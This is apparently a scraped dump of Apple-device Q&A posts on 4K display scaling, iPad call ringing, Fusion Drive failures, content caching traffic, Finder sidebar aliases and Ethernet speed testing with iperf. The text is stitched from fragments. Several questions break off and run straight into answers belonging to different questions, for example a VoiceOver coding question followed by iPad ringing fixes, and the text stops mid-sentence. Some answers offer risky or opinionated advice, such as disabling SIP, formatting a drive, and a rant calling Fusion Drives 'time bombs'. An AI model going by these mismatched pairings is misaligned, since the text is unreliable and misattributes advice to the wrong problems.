I'm looking to buy an external display but can’t wrap my head around one thing: does 4k monitor behaves like retina (in other fonts looks sharper, etc.) if scaled to smaller resolution e.g. 1080p?  \nOr would it just work like a regular 1080p display?\nSorry if that sounds awkward. My concern if there is a visual difference between 4k with 1080p vs 1080p with 1080p resolution.  \n\nA: On macOS you have both choices when connecting such a 4k monitor:\nYou can choose to have it run at a real 1080p resolution, where the signal sent to the monitor is really 1080p. In essence the image displayed on the 4k monitor would then be visually the same as had you bought a 1080p monitor of the same physical size.\nYou can also choose (which is most probably what you want) to have it run scaled to \"Looks like 1080p\". This means that the signal sent to the monitor is really a 4k signal, but user interface elements are scaled to be the same physical size as if you had been running 1080p. This ensures that the system is usable without requiring extraordinarily good eye sight. Note that this means that text is really drawn at the large resolution, which ensures crisp and sharp text, which is easier to read. Images and video are also displayed at a larger resolution (if available), which means you get better picture quality on the 4k monitor compared to a 1080p monitor.\nIn addition to the two scenarios outlined in your question and above, you also have the third option of running the monitor in a 4k non-scaled resolution. This means that you'll have a very large amount of screen real estate (i.e. room for lots of windows, content, etc.) - but everything will be 4 times smaller physical size - so this is usually only a good choice if you buy a really large monitor (like for example when using a 50 inch TV as a monitor).\n\nA: A 4K display scaling to 1K would display each 1K 'logical' pixel using a 2x2 'real' pixel block. So it will look like a 1K display, possibly with slightly more noticeable pixels.\nApple's Retina system works similarly, except that each pixel in that block can be different. This gives you the scaling of objects at a more comfortable \"1K\" size, but with the higher definition of 4K.\nIf you buy a 4K display, any Mac can use it as a 'Retina' display, as the scaling is done on the computer. I don't think it should affect your purchase decision. \n", "Q: VoiceOver reading results of Swift Playground print statements in Xcode \n(By way of background I have been helping a local blind child learn coding.

I am forced to shutdown the iPad to stop the ringing.  The inconvenience is enough to seek a solution.\nWhat can be done to correct the issue?  The iPad should stop ringing when the iPhone answers the call.\n\nA: First, let's remove the iPad as a device that is allowed to receive calls from your iPhone. \n\nOn your iPhone, go to Settings > Phone > Calls on Other Devices, then\n  turn off Allow Calls on Other Devices for that iPad. \nOn your iPad, go to Settings > FaceTime, then turn off Calls from iPhone.\n\nThen restart both devices.

Make sure both ring, but see if the iPad stops ringing when you pick up the call on the iPhone.\nIf the issue persists, check the software version for both devices and make sure they are on iOS 12.4.1 as of this post. If so I recommend backing up the iPad before continuing to the next step.\nNext let's try Reset All Settings on the iPad (DO NOT ERASE iPad). \nReset All Settings sets to default all of your preferences and settings within the Settings app. This is why I recommend backing up the iPad before doing this.\n", "Q: Share Clipboard with VNC Server on Ubuntu from Mac OS X Mojave I am unable to share clipboard from my Mac OS X 10.14.6 Mojave MBP to the remote Ubuntu 16.04 desktop running x11vnc or vino VNC server.

On which of the 4 ports?\nThe Apple specifications page does not provide this important detail.\n\nA: The Thunderbolt 3 standard distinguish between two types of supplying power over the connection - either for \"charging\" or for \"bus-powered devices\". \nThe standard supports up to 100 watts for charging, which is it what you refer to. This is usually only supported by dedicated chargers or docking stations meant to charge laptops.\nThe minimum requirement of the Thunderbolt 3 standard however is that the computer must be able to provide 15 watts of power to \"bus-powered devices\".

Therefore I think it's an iMac issue. \nWhat can fix this issue?\n\nA: Is the iMac an older model with a hard disk instead of an SSD? It takes a while for hard drives to 'spin up' compared to an SSD in a newer MacBook Pro.\n\nA: If you haven't already try resetting the SMC and the NVRAM (PRAM) on your device. \nNext try booting into safe mode (safe boot) and then try to restart the Mac afterwards and see if that helps. \n\nSafe mode (sometimes called safe boot) is a way to start up your Mac\n  so that it performs certain checks and prevents some software from\n  automatically loading or opening. Starting your Mac in safe mode does\n  the following:\n  \n  \n*\n  \n*Verifies your startup disk and attempts to repair directory issues, if needed loads only required kernel extensions \n  \n*Prevents startup items and login items from opening automatically \n  \n*Disables user-installed fonts  \n  \n*Deletes font caches, kernel cache, and other system cache files\n  \n\nPerhaps reinstalling macOS via macOS Recovery can help. \nAlso depending on your model and year of iMac, you may be able to upgrade the amount of memory in it and possibly double the current amount.\n\nA: A definitive answer isn't possible with the information provided, but your question showed up in my search for answers to a similar issue. I spent some time researching my issue; your issue sounds similar, so here's my answer:\nAnswer:\nYou mentioned in a comment that your iMac vintage is ca. 2019. If that's the case, it's very likely that your iMac was equipped with a Fusion Drive. As it turns out, Apple decided to prioritize their profit margins over the service life of the products they manufactured and sold. The result is that all models of Mac hardware equipped with a Fusion Drive are ticking time bombs; Apple's design decisions virtually guarantee your iMac will die an early death.\nBut you shouldn't take my word for that - you should do your own research. I freely admit that I am a strong skeptic of Apple's current business practices; in fact, I have come to despise these practices. I am biased. However, I was also trained as an Electrical Engineer, so I still try to discount that bias when attempting to solve problems. In this case, I relied upon the following for this answer:\n\n*\n\n*My general knowledge of the wearout mechanism in flash drives(search refs 1),\n\n\n*Numerous opinions I found online(search refs 2),\n\n\n*Analysis from this source in particular due to the author's objective analysis.\n\n\n*Diagnostics produced by the DriveDx drive diagnostic tool.\nI will further opine that Apple should have recommended DriveDx to all customers with Fusion Drives as their own Drive Utility is worthless for diagnosing the SSD component of a Fusion Drive. Apple must have been aware of the design issues, and their failure to provide any remediation or early warning to customers shows lack of good faith, and even negligence. Equally reprehensible is the fact that Apple now refuses to repair these defectively-designed Fusion Drives once your machine reaches a certain age.\nAgain: You needn't rely on my opinions; you may review my sources, or find your own.\nIn Closing:\nI'm posting this answer 3+ years after the question was originally posted, and it seems likely that it may not be of much help to the OP at this time. However, I have no doubt that others have experienced, and will continue to experience premature failures; Apple didn't discontinue use of Fusion Drives in all products until November 2021.\nI was motivated to post a question here based on my experience with the Fusion Drive. I feel I learned something from the experience - including some repair options that may keep your Apple hardware out of the local landfill.

Possible there's even more than one.\nThe most obvious one is that it allows for introducing other features than text selection in messages by using the same touch gesture for those other features.\nHowever it is not so that it is impossible to copy only part of a text message with iOS 10 and newer - it is just more complicated. You can copy part of a text message by tapping and holding on the message, select \"More...\", press the forward arrow, and then tap and hold on the text message to select as usual.\nThere are no legal or regulative requirements in the US or in Europe that explicitly requires Apple to not offer text selection in messages.

Nor do Apple stick completely to the DisplayPort spec; getting 4K out of a 2013/2014 machine requires one part luck and one part voodoo – and you can forget about display daisychain :)\nmacOS is also extremely fussy about the output device resolutions that it will respond do – if the display signals (via EDID) to the Mac a resolution that doesn't exist in its lookup table, it goes all \"talk to the hand, la la la …\". To get macOS working with something it otherwise turns it's nose up at, you can either phone Apple Support and ask for an EDID Override file for that specific display device, or you can buy a copy of SwitchResX which will let you edit in whatever display resolutions you like.\n\nA: I am assuming that the screen resolution of MacOS is higher than your projector or vice-versa. \nHave you checked the option Scaled from Resolution option on Display and give a try with a different option from 1920 to 1280?

If there are any duplicates within B does not matter.\nIn detail:\nOn my Mac I have large collection of photos and images. Lets say they are all located in /Users/JustMe/PhotoCollection/ or its sub folders.\nWithin these folders there same known duplicates which where created intentionally. For example I have one folder Summer Vacationand a sub folder which holds all vacation photos which should be used for a photo book.

Additionally they can scan for similar pictures which are not 100% identical but almost the same.\n\nA: It looks like you're into photography and you haven't been keen for best practices for managing files. You have two options now.\n1) You'd have to create (bash OR python script) which would look for MD5 checksum of the files and would delete only it finds duplicate with later date. Keep in mind, one careless step can delete the files you didn't want to delete. \n2) (Suggested) There are several free and paid utilities that should be used to cleanup the duplicates. If it provides duplicates with date comparison. As you already mentioned (Gemini). I tested it few months ago and found it very useful.\nThere are several proven practices to manage the photo library.

The system immediately shuts down when the charger is unplugged.  Oddly, even after intentionally shutting down the computer, it auto-starts when I open the lid.  \nI reset the PRAM and SMC, which didn't help.\nThis began several weeks ago when the system shut down for no apparent reason.  When I restarted, the system date was way off.  I reset it to auto detect the date. I could still operate under battery power, but it would shut down long before the battery was drained.  \nNow it will not operate on the battery at all.  After this random shutdown the battery condition was displaying Replace Soon. Now it displays Replace Now.  Cycle count is 194.  System information shows that the battery is not charging, even though plugged in.  For several months now I have noticed that the case will sometimes get very hot to the touch above the keyboard at times.  I installed Macs Fan Control and verified both fans are working properly.\nHow can I resolve this problem?\n\nA: Your battery is old even if it still has a low cycle count. You might even have a battery that has been damaged in production. In all cases you should not continue using your MacBook in this condition. The battery could start producing gases, inflating and destroy it in the process.\n\nA: You could reset the SMC again, making sure you refer to Apple's documentation to double-check you've reset it properly.\nHowever, since the SMC reset hasn't resolved this (as one would expect), your battery status is most likely key to your problem.\nWhile MacBook Pro batteries have a life expectancy at or around 1,000 cycles, it's not uncommon for batteries to exceed or fall short of this number; as every user is different in terms of what they use their computers for and how/when they're using AC power etc. So the 1,000 cycles is just an estimation of how long it can last. But, in your case, it appears that time is the biggest issue (i.e. while your battery has done less than 200 cycles, it likely needs replacing because of its age).\nSo, if resetting the SMC doesn't work, it's time to replace your battery.\n\nA: Take it to an Apple Store soon!!\nThe Late 2013 MBP is still supported by Apple, but the Early 2013 is not (so the Late 13 model is likely to go out of support soon.) A new battery will give your Mac years more life -- they actually replace the whole top case, including keyboard and trackpad.\n", "Q: Python Launcher shows nothing on the terminal I installed python 3 in Mac OS.

From there open Terminal from the Utilities menu.

Considering I can't connect the iPhone to the pc and backup that way, what options do I have to get her photos off her phone?\nThanks\n\nA: You have quite a few options, any of these should work, choose the one you like the most:\n\n\n*\n\n*I see your cable isn't working properly, but you may try to connect the iPhone to a PC with iTunes for just enough time to enable the wireless (Wi-Fi) syncing feature (press apply to save and enable it). Then, you can create the backup on the PC wirelessly, transfer photos, etc.\n\n*You can try to download Google Photos and let it sync all of her photos. You will lose quality on photos and videos if using the free service, but you may transfer any amount of data this way, and the photos will automatically be on her Android phone if she uses the same Google login on it.\n\n*Use iCloud Photo Library. It's available on iOS 10.3 and later. If she has less than 5GB of photos, it's free: enable the iCloud Photo Library on Settings > [her name] > iCloud > Photos and let it sync all of them. You can then download them on any PC from iCloud.com. If she has more than 5GB of photos, you will need to purchase 1 month of the service with the amount you need (from $0.99 for 50GB to $19 if I'm not mistaken for 2TB).\n\nA: Install iTunes on a PC and then connect the iPhone to it.\niTunes is a program with specific features to manage data, apps, and store backups for an iPhone. After you've installed it, and perhaps restarted, open iTunes and then connect the iPhone using a standard Apple lightening cable (as shown here) to the USB port. Note that there are many non-Apple cables that will NOT allow the iPhone to be recognized, so if you have problems make sure you have an Apple cable.\nOf course, another way would be to use someone else's Mac. iTunes comes standard on Macs.\nPlease ask if this doesn't solve your problem.\n", "Q: Random, frequent panic reports iMac 27 \"- Retina 5K, 27-inch, 2017, 3,5 GHz Intel Core i5. 8G RAM.

No MCA data found.\"\n\nSadly to say this has been happening ever since:\n\n\n\nUnfortunately, OS updates didn't fix this what seems to be a hw. issue, for Intel's Developer Manual says:\n\n\"15.1 MACHINE-CHECK ARCHITECTURE The Pentium 4, Intel Xeon, Intel\n  Atom, and P6 family processors implement a machine-check architecture\n  that provides a mechanism for detecting and reporting hardware\n  (machine) errors, such as: system bus errors, ECC errors, parity\n  errors, cache errors, and TLB errors. It consists of a set of\n  model-specific registers (MSRs) that are used to set up machine\n  checking and additional banks of MSRs used for recording errors that\n  are detected.The processor signals the detection of an uncorrected\n  machine-check error by generating a machine-check exception(#MC),\n  which is an abort class exception. The implementation of the\n  machine-check architecture does not ordinarily permit the processor to\n  be restarted reliably after generating a machine-check exception.\n  However, the machine-check-exception handler can collect information\n  about the machine-check error from the machine-checkMSRs. Starting\n  with 45 nm Intel 64 processor on which CPUID reports\n  DisplayFamily_DisplayModel as 06H_1AH (seeCPUID instruction in Chapter\n  3, “Instruction Set Reference, A-L” in the Intel® 64 and IA-32\n  Architectures SoftwareDeveloper’s Manual, Volume 2A), the processor\n  can report information on corrected machine-check errors anddeliver a\n  programmable interrupt for software to respond to MC errors, referred\n  to as corrected machine-check error interrupt (CMCI). See Section 15.5\n  for detail.Intel 64 processors supporting machine-check architecture\n  and CMCI may also support an additional enhancement, namely, support\n  for software recovery from certain uncorrected recoverable machine\n  check errors. See Section 15.6 for detail.\n15.9 INTERPRETING THE MCA ERROR CODES When the processor detects a machine-check error condition, it writes a 16-bit error code to the\n  MCA error code field of one of the IA32_MCi_STATUS registers and sets\n  the VAL (valid) flag in that register. The processor may also write a\n  16-bit model-specific error code in the IA32_MCi_STATUS register\n  depending on the implementation of the machine-check architecture of\n  the processor. The MCA error codes are architecturally defined for\n  Intel 64 and IA-32 processors. To determine the cause of a\n  machine-check exception, the machine-check exception handler must read\n  the VAL flag for eachIA32_MCi_STATUS register. If the flag is set, the\n  machine check-exception handler must then read the MCA error code\n  field of the register. It is the encoding of the MCA error code field\n  [15:0] that determines the type of error being reported and not the\n  register bank reporting it. There are two types of MCA error codes:\n  simple error codes and compound error codes.\"\n\nI am yet to take it to a repair test for I have, as you all probably do, the engineer mentality, trying to understand the root cause for a brand new system behaving this way. It seems imho hard to fathom that a brand new system has to have the OS reinstalled from scratch, as often suggested by Apple's support.\n\nA: There is certainly something wrong with your  hardware (graphics card).

On this BootCamp Windows 10 (Not officially supported by M-Audio FireWire 410), I run the \"M-Audio FW Device Enabler\", then I can see the Sound device \"%MAFWFU.DeviceDesc%\", then I click Enabler, then I can open the \"M-Audio FireWire Control Panel\", but the \"mixer\", \"output\" and \"hardware\" tabs are all empty.  I suppose the last M-Audio FireWire 410 V6.0.01 Driver only supports Windows Vista 64-bit and Windows 7 64-bit.  Thus I tried to install one more Windows Vista instance on the same disk.\nI then use Disk Management on the BootCamp Windows 10 to shrink the BootCamp volume and leave out another empty partition of 100GB.  I tried to create a \"New Simple Volume\", but there is a warning of \"....will convert the basic disk(s) to dynamic disk(s).... will not be able to start installed OS from any volume on the disk(s) (except the current boot volume)....\".

At this point, I would recommend concentrating on undoing any damage that you might have caused by the steps you have already taken. You should edit your question and post the output from the following commands.\ndiskutil list\nsudo gpt -r show /dev/disk0\nsudo fdisk /dev/disk0\n\n\nNote: You will have to disable System Integrity Protection (SIP) before entering the gpt and fdisk commands.\n\nThe above command will not change your disk. The command just output the current state of the internal disk partitioning. Also, I have assumed you have just one internal drive.\nThe more complex answer would be the following. Yes, you could have Windows 10 installed in one primary partition and then install Vista in another available primary partition. This could be set up as a dual boot arrangement. (This dual boot arrangement is unrelated to the dual boot between macOS and Windows.) However, I would first install Vista without a dual boot arrangement. In other words, to switch between Window 10 and Vista you would have to manually change to active partition. If you still wish to install Vista (I assume your Mac is Vista compatible), then I would still want to see the output from the commands given above.\n\nA: Please keep in mind few things.\n1) Keep your question that addresses one problem in one thread.\n2) You’re lucky that you’ve been messing with disk partitions for two BootCamps and haven’t killed your machine to death.

We cannot change this behavior. Source.\n\nA: You might want to turn on \"group windows by application\" in System Preferences -> Mission Control. This has a payoff which you have to decide :). You won't be able to see full window when they'll be stacked. This can be overcome by hovering the cursor on a window and press the space bar to zoom in only on that window.

However, it will only be carrying video signal, not data or power. As such, it will not make the USB ports on the monitor work.\n\nA: All Thunderbolt ports are also DisplayPort ports, but not all DisplayPort-capable ports carry Thunderbolt. The six shaved-squared-corners Thunderbolt 2 ports on your Mac Pro actually start out as Mini DisplayPort, and appeared under that name as video outputs a full year before we saw our first Thunderbolt logo on anything.\nIf your new display just has regular DisplayPort inputs, a simple cable with MiniDP on one end and DP on t'other will be more than adequate.\n", "Q: Can I submit an app to the App Store that needs a hardware device not available in the market(yet)?

After installing, my Mac prompted me to Restart. While installing the update I noticed that the Apple Logo with the progress bar disappeared. Shortly after, the screen went black and the Macbook froze. I tried a hard reset, but it keeps booting to the \"question mark\" folder. I tried several boot up methods, clearing NVRAM, starting in safe mode etc, but the Mac simply ignores my keyboard inputs while starting up. My guess is that the Firmware / EFI got corrupt because I can't use any of the key combinations. I can only boot to the question mark folder.\nDoes anyone have any recommendations or ideas?\nThanks in advance and sorry for my bad English :) !\n\nA: I had the same experience with my MacBookAir. Turns out Catalina killed the firmware and the only solution according to the Genius Bar is to replace the motherboard. That is around 500 Bucks in my case.\n\nA: Boot to Internet Recovery and erase / install is the best path when any update happens. In the vast, vast majority of cases you will be fine and only Macs with T2 chip would need an assist to re-flash the EFI. Yours is amenable to target mode boot and all the normal ways to reinstall the OS when it’s not bootable from the internal drive.\n\n\n*\n\n*Reset the SMC one time - https://support.apple.com/en-us/HT201295\n\n*Internet Recovery would work for newer Macs - https://support.apple.com/en-us/HT201314 - your mac needs you to bring a bootable USB or drive to it or to connect in Target Disk Mode to another mac to image it / run the installer against your storage.\n\n\nA: There are few possible scenarios.\n1) Seems like your mac equivalent of bios is updated to not accept any previously supported boot methods. (Less likely).\n2) The new boot loader is not allowing your “outdated” system for Catalina. (Thanks to Apple). If you were able to install previous beta versions of Catalina, this is also very less likely.\n3)Your Boot partition is simply messed up during a restart or something.\nMy suggestion is to make a USB installer of the supported OS. You’d need a separate working system for that involving a free utility called DosDude. \nHopefully, you’d be able to install the previous supported stable OS (10.14.6) without formatting the HDD.\n\nUPDATE:\n\nThere is one hack (I'm not sure about MBP) but I experienced few years (some 20 years ago) on an unbranded desktop is to take out the battery (2032 battery cell which is found on motherboard) and place it again after few seconds. This is how we used to reset the motherboard.\n=========== \n1) Take out your HDD out of your MBP and connect it with as an external drive with some working computer. (TAKE THE BACKUP) and Format the HDD. Probably now, it won't have any issues with your computer.\n2) If it still doesn't work, your BIOS firmware is corrupted.

It's rare that I let the phone run past 80% and even rare that it goes past 60%.\nIs this likely to damage the battery?\nThis Macworld article says isn't optimal, although it won't necessarily damage your battery. However, I've seen other people stating that charging to 100% is very damaging which is why Ios 13 will have measures to prevent it. Further still, I've seen articles state that iOS 12 already is designed to cope with charging at 100%, and the iOS 13 improvements are more to do with overnight charging. \nWhat's the correct answer?\nAlso, as should I shut down the phone at night if it is not charging?\n\nA: No it doesn’t. Any 2018 or newer hardware and iOS can handle kiosk mode / constantly charged batteries much better than the old controllers so you should just keep it charged if you like that.\nYour XR can be kept 100% topped off without any long term harm.\nI disagree with Mac World and only think you should shut down the phone if you don’t regularly do that from time to time (you should do that weekly IMO) and it’s no problem to connect to charge and then power it off. The charging runs without the OS but there’s no benefit to being off while charging in all but some weird edge cases (where the software is so broken it’s running CPU constantly).\nAlso - some older questions here have old advice for the previous design, when this was in fact a problem if you didn’t care about having a fully charged battery and only cared about years and years between the battery being consumed.\n\n*\n\n*What are the best practices for battery longevity?\n\n*Is charging my iPhone all night harmful?\nThose above questions should probable be locked as “historical” and not used for the iPhone X and newer and corresponding new MacBook / iPad / Apple Watch and more smartly engineered devices that preserve the battery longevity much better than could be accomplished in the past.\n\nA: Here is the best article I've found on the subject of how to care for your Phone battery. It's brief, but authoritative.\nThe main points are this:\n1) Don't keep it plugged in when it's fully charged\n2) don't \"try to reach 100%\"\n3) Plug in your phone whenever you can\n\nIn reading it again, I see keeping it cool is also important -- I'm glad I reread it to notice that.\nAlso, checking on Settings-->Battery to see the graph showing exactly what apps are draining battery helps me realize what causes the most battery stress.

The dock stays where it was located.\nThis is where it gets weird.\nIf I want the dock to move, I have to select a window in the display that I want the dock on, then type text into a text field in that window, then bring the mouse to the bottom of the screen. That makes the dock move.\nAny ideas how to fix this?\n\nA: I am using 10.14.6 also, and have noticed no issues with the dock on my computer, except I just use Auto-Hide for the dock so it disappears until I need it.

Traffic didn't come from my devices according to my testing. This stopped after I disabled SSH and SMB, changed password, and enabled firewall (I did them all at once). What happened? Why and how was it serving so much data?\nFull details:\nI have setup a headless late 2014 Mac mini on my local network for Apple content caching. It runs macOS Mojave, it’s connected to the network using Ethernet, it’s freshly formatted and up to date as of this writing.\nSetup was super straightforward: check a box on sharing, disable sleeping on energy saving, wait for clients to connect.\nI had also enabled SSH, VNC and SMB, changed users to “administrators only” on each of them, installed the Server app and few other utilities (docker, AirServer, DriveDx, server apps from the Mac App Store).\nI have about 5 clients (Macs, iPhone, iPad, Apple TV) that usually connect to it. None of them normally consume much data: the first 7 days I got it running, they transferred a total of 37GB of data. I have an AirPort TC (WPA2 Personal with DHCP, not NAT) which, every time I checked, only showed these 5 devices on the Wi-Fi network, and the Mac mini is the only one on Ethernet. The ISP router has NAT but wireless is disabled. The macOS Server app shows “reachable, no services”.\nBut on the 8th day, around the time I decided to do a full SMART disk self-test on the HDD, the content caching server started serving 12GB per hour, every hour, non-stop, from origin (not cache). Seemed strange. I turned off Wi-Fi on all of my devices to sleep it off and see whether it would stop: it didn’t.\nAs far as I know, the Mac mini itself doesn’t use its own content caching for downloading content for it (which I thought was strange), so I ruled it out as the source of all downloading.\nOn the third morning of constantly serving 12GB/hour (from origin) and a total of 336GB served, I got very worried and disabled SMB, SSH except VNC (or else I can’t access it), changed the admin password (previously it was neither an easy nor a short one), enabled the firewall (the default is off on a fresh install) and since then, the content caching has been serving 0 bytes for the last hours. Caching is still working for my 5 devices.\nApple says caching server doesn’t do networks other than local by default. My ISP’s upload speed is pretty much constant at 20mbps (2,5MB/s), so I think it’s not completely impossible for this data to have left my local network because it was being served at approximately 25~28mbps.\nWhat could possibly have caused this? Could there be an unknown reason or nefarious client at work here? Could any data have been stolen?\nI’ve never used content caching before, but Apple docs say data is encrypted. The log is huge and doesn’t seem to help me because, if I understand correctly, it doesn’t log IPs by default. I didn’t get any warnings for any of my Apple accounts, I have 2-factor auth for pretty much everything.\nI also have pi-hole logs, but all network usage is merged into a single, virtual IP.\nThanks in advance and sorry for such a long question.\n\nA: Need more details to really say anything conclusively.  When the data transfer is happening, you should run sudo nettop and look at the local addresses the AssetCache service is connecting to.  This will reveal what device on the local network it's serving, or the lack thereof. \nSome other quick thoughts:\n\n\n*\n\n*I'm fairly sure content caching DOES apply to the local machine.  So updates downloaded by your Mac Mini will be counted and cached.\n\n*Do system wide network usage stats show at least as much data transfer as the Content Caching stats? If not then it's probably just a bug in content caching statistics.\n\n*Are you using iCloud? Content Caching can include iCloud content if you have that enabled.\n\n*Do you have an iOS device plugged in over USB and have tethered caching enabled? That's a potential source.\n\n*Try looking at the content caching log while this is happening: sudo log stream --predicate 'subsystem == \"com.apple.AssetCache\"' --info\n", "Q: How to access the iCloud Drive Archive folder on my MacBook? I couldn't find 'iCloud Archive' folder in the Finder. I have been searching it everywhere in the desktop to the different folders, but I couldn't find it.

Whether you decide to keep a local copy or not, a new Desktop and Documents folder is created in your home folder.

When I click this icon, it opens the URL that is open on the other Mac.\n\nI have three questions: How does this (technically) work, how is this feature called, and how do I disable it?\nAs for the technology, I assumed that the URL of the frontmost browser window would be shared using a discovery service (DNS-SD, formerly Bonjour), but I couldn't detect it with a Bonjour browser.

I want applications to be switched separately on laptop and external monitor, and not to be synced as it happens now. is it possible?\n\nA: It sounds like you're breaking the Spaces paradigm by having one app over two Spaces. If you do that, behaviour will be at best unpredictable. \nYou could possibly mitigate this by unchecking System Prefs > Mission Control > \"When switching to an application, switch to a Space with open windows for the application\" [but this is untested as I don't use \"Displays have separate Spaces\".]\n\nA: You should use different spaces for different screens and open the apps in their screens accordingly.\n\nSystem Preferences > Mission Control > Displays have separate spaces\n\n", "Q: How to measure local Ethernet speed My Mac mini is connected to my router/modem by Ethernet. I want to know how fast the connection speed is between the Mac and the router.\nObviously, I can use a website like Speedtest.net to get my Internet connection speed, but that doesn't tell me whether the Ethernet connection is a limiting factor, or how much 'spare' capacity there is for local traffic.\nThe mini serves to other devices. The Ethernet is over a powerline, and the cables are ancient, so may not be optimal.\nIf I were using Wi-Fi, then the data throughput is shown by holding Alt and clicking on the Wi-Fi menulet icon.\n\nA: As a rough idea - your speed must be somewhere between 47 and 100 Mbps. Must probably it is 100 Mbps. \nIf you want to test, get a second computer and take the connection out of the router and plug it into that. Then you can start a transfer from one to the other and measure the speed. \nOne of the most common tools for making such a transfer and measuring its speed is called \"iperf\". You can install it via HomeBrew (if you have that), or you can download the Mac binary from their webpage.\nAfter installation, start Terminal.app on both computers and run:\niperf -s\n\non one, and:\niperf -c 1.2.3.4\n\non the other. Replace 1.2.3.4 with the IP address of the first computer.\nAfter a short while it will tell you the bandwidth in Mbits/sec.\n\nA: Found an app called LAN SpeedTest, which unsurprisingly is well-suited to the task.\nRunning it on another computer, connected directly to the router by Ethernet, and writing/reading a chunk of data to a shared folder on the Mini, it gives Read speeds of c.60Mbps and Write speeds of c.50Mpbs.\nWhy it's so low is, of course, another question.\n", "Q: LAPACK, BLAS, ATLAS on Mac book pro 2017, Mojave I want to know if and where LAPACK, BLAS, ATLAS packages are installed.

In more recent macOS's (such as Mojave), dragging the ~/.Trash folder to the Finder Sidebar does not work properly anymore. When you do that, the sidebar text displays a ? instead of Trash.\nThe ? still works temporarily, but after you reboot or run killall Finder, and try to open ? in the sidebar, you get the error \"?\" can't be opened because the original item can't be found.\nIs there a way to add the Trash folder to the Finder Sidebar anymore?

That solution does not work anymore.\nRelated links:\nhttps://discussions.apple.com/thread/8498936\n\nA: Several of us over on MacAdmins pulled this issue apart earlier this year when a user complained that their Sidebar not only wouldn't hold his Trash icon, but kept resetting back to default settings-and-layout on a very regular basis.\nThe Trash folder complex (and it is complex) has to track files from multiple volumes and from multiple users across those volumes, and several changes they made to the Trash 'engine' to work with APFS affected other parts of the OS.\nSidebar reset has been a minor nagging issue for many years, though, but the cause wasn't figured out until recently: Static user Sidebar items (the things you add to Favourites, etc) are linked to their target by the Finder itself, using an always-running subset of the code that drives 'Folder Actions'. Unfortunately, if a previously-specified target isn't where the Sidebar link code says it thinks it is, it updates its cache with zeros, which causes the Sidebar panel's .plist to reset. The Trash, because of its be-many-things-but-appear-in-one-place nature, cannot maintain a static reference, so the Sidebar goes \"ptui!\"\nAnything that can change its reference - or even disappears and reappears of its own accord, like a network share - should never be put into the Sidebar.\nThe Sidebar is happy as long as things don't go missing, so how can we make transitory objects like the Trash and network shares appear to always be there? The solution is rather obvious in hindsight:\nAliases.\nMake an alias of the item you want in the Sidebar, and add the alias itself to the Sidebar. Aliases are files with their own target references, so they just sit there acting as a middle-man twixt Sidebar and targets.\nMake a new folder in your ~/ as a repository for the aliases you want Sidebar favourites for.\n\nA: You can have/use it only if you have set invisible files in Finder.\nIn Finder with invisible files visible:\nselect your Home folder, find Trash, drag it to the sidebar.\nBUT: as soon as you go out of invisible files there is a ? mark in the sidebar and the Trash is not found.\n", "Q: Reduce the size of photo sent with Messages.app on iPhone When using Apple’s Mail.app, a mail message offers a pop-up menu to reduce the size of an enclosed image.\n➥ How can I do the same when shooting and sending photos from within Messages.app on an iPhone? \nCurrently my iPhone sends out huge 3.3 meg files where 120K would do.\n\nA: I cannot comment on popup asking for file size, but in Messages settings, Low image quality mode can be turned on. See last option in Settings -> messages It will be set for all images. \n\nA: You can open the file with Preview and change the size of the file before you send it via message. From the Photo app you can export the photo as a jpeg say and then open it in Preview. Under the Annotate menu in Preview, you can save the size of the file. Once you decreased the size, you can then save it and send it using iMessage.\n", "Q: Deleting contacts from \"All iPhone\" also delets them from \"All Exchange\"? On my iPhone SE, I found that my \"Default Account\" for Contacts was iPhone.  That was why newly created contacts would not sync with an Exchange Server.  So I changed it to Exchange.  I did not like the fact that migrating the iPhone contacts to the Exchange account needed either a 3rd party app or transferring through the cloud in some way.  So I handraulically re-typed the contacts as new contacts in the \"All Exchange\" group.  I made sure that the \"All iPhone\" group was unchecked.  This caused the new contacts to sync with Exchange Server.\nTo tie up lose ends, I made sure that only the \"All iPhone\" group was checked, then deleted the re-typed contacts from that group.  Then I made sure that only the \"All Exchange\" group was checked.  Lo and behold, the contacts were gone.\n1) Is this a bug?\n2) How do I avoid this?\n3) And how do I prevent Contact settings from switching to iPhone?  I seem to be always switching it back over the years, after being burned repeatedly.\nThanks.\n\nA: All iPhone [or All iCloud if you have that set up] is the 'master list'.\nAll contacts are in that list.\nAll other lists are sub-sets of that.\nAnything not in any sub-set will only appear in the master list.\nIf you delete something from the master list you are also deleting it from any & all sub-sets.\n", "Q: How to completely stop \"Disk Not Ejected Properly\" message?

Username, passcode and IP address are correct. We keep getting the error code 0x204.\nWhat could prevent him from using it when it previously works when tested at home???\n\nA: \"...at the local library network...\"\nMost likely the library's firewall/router appliance blocks RDP. This is a good security measure to keep bad actors from attempting to take control of compromised PCs inside the library's public net, as well as keeping bandwidth down from users who should be using the library net for library-related activities such as database searching, etc. I bet a port scan will show other blocked protocols as well.\nWe lock our network down tight where I work.\n", "Q: How to wake up MacBook Pro with external display with lid closed?

My boyfriend and I share location thru Messages and Find My Friends. \nI used to be able to see either a purple or gray arrow in settings whenever my location was checked...but not anymore. I just tested it again and had my sister locate me...the arrow appeared in the status bar, but the only purple arrow in settings was under system settings. And, sometimes when I don't allow location access in Messages and Find My Friends, people can still locate me.\nBasically, I want to be able to see indicators when someone has checked my location, and I want to be able to disable it altogether when I don't want my location shared.\nWhat do I need to do to make it work this way?\n\nA: For seeing the icon indicator when someone checks your location, you need to go to Settings > Privacy > Location services > System services (all the way to the bottom). Then go to the bottom again and check “show status bar icon”.\nPlease note that this will make the indicator show whenever any of the system location services use your location, not necessarily when someone checks your location on Find my friends. You will probably see the icon very often and it might rarely be caused by Find my friends.\nThe purple and gray arrows can be seen on the same page, by the name “location sharing”. You can also disable it there so people won’t see you, but it’s better to enable or disable it directly on the Friends app.\nFor temporarily disabling your location on the service, open the Friends app and tap your name. Then enable or disable “share my location”.\nIf your location indicator on the map is red, you can’t be seen by your friends. If it’s blue, then the friends you are sharing your location with can check your location.\nThe message your friends get when you disable sharing is the same as they would if you didn’t have an internet connection: “location unavailable”.\n", "Q: How do I remove ALL PHOTOS from iPhone? I have 26K photos on a 64GB iPhone 7 and running iOS 12.4\nHow can I delete all photos en-masse?  That is, removing all photos from the iPhone's Camera Roll.\n\nA: Your question doesn't full specify what you're wanting or what you've already tried, so I'm assuming you want to do this directly from your iPhone (as opposed to doing it while your iPhone is connected to a Mac/PC).\nI'm also assuming you're just wanting to free up space and you've already backed up your photos. If so, you can follow these steps:\n\n\n*\n\n*Open the Photos app on your iPhone\n\n*Tap on the Albums icon down the bottom\n\n*Tap on the Camera Roll album at top left\n\n*Tap on Select at top right (the word Select will change to 